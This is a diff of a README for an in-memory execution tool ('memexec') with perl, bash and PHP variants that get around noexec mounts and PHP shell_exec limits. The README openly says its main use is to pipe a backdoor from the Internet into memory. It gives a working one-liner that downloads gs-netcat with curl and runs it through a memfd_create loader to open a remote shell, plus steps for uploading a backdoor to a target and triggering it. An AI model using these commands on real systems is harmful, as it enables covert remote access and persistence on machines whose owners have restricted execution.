@@ -14,31 +14,34 @@ Use _one_ of the 3 scripts (perl, bash, php):
 
 Read the [circumventing the noexec Article](https://iq.thc.org/bypassing-noexec-and-executing-arbitrary-binaries) for more....
 
-PERL example:
+`TIME_STYLE` and `-lah` are used as an example to pass through environment parameters and command line options. 
+
+### PERL example:
 ```sh
 source memexec-perl.sh
-cat /usr/bin/id | memexec -u
+cat /bin/ls | TIME_STYLE=+%s memexec -lah
 ```
 This was golfed by the fine people on Mastodon ([@acut3hack](https://@acut3hack@infosec.exchange), [@addision](https://@addison@nothing-ever.works), [@ilv](https://@ilv@infosec.exchange))
 
-BASH example (by [@messede-degod](https://github.com/messede-degod):
+### BASH example (by [@messede-degod](https://github.com/messede-degod)):
 ```sh
 source memexec-bash.sh
-cat /usr/bin/id | memexec
+cat /bin/ls | TIME_STYLE=+%s memexec -- -lah
 ```
 
-The educated reader understands that this is mostly used to pipe a backdoor from the Internet directly into memory, even when execution is prohobited by `noexec`:
-```shell
-curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | GS_ARGS="-ilDq -s ChangeMe" perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@"
-```
-
-The PHP variant also circumvents ["shell_exec" restrictions](https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/).
+### The PHP variant also circumvents ["shell_exec" restrictions](https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/).
 
 1. Upload `memexec.php` and `egg` (your backdoor) onto the target
 2. Call `curl -SsfL https://target/memexec.php` will execute `egg`
 
 (This is my way of saying "hey. how are to?" to my old [team-teso](https://en.wikipedia.org/wiki/TESO_(Austrian_hacker_group)) colleague and long time PHP developer [@i0nic](https://x.com/i0n1c))
 
+---
+
+The educated reader understands that this is mostly used to pipe a backdoor from the Internet directly into memory, even when execution is prohobited by `noexec`:
+```shell
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | GS_ARGS="-ilD -s ChangeMe" perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@"
+```
 ---
 
 For the addicts, here is the nasm of the shellcode (memfd_create, copy loop & execveat):
